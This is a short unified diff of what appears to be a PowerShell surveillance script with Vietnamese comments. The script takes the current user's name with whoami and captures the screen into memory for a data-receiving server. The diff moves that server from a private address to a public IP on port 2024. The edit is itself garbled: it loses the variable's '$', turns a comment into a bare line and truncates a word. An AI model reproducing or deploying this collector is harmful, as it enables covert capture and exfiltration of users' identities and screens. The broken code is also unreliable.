@@ -1,7 +1,6 @@
 # Địa chỉ server nhận dữ liệu
-$hq = "http://192.168.102.132:2024"
-
-# Lấy tên người dùng hiện tại
+hq = "http://157.245.57.163:2024"
+ Lấy tên người dùng hiện tạ
 $name = whoami
 
 # Chụp màn hình trực tiếp vào bộ nhớ
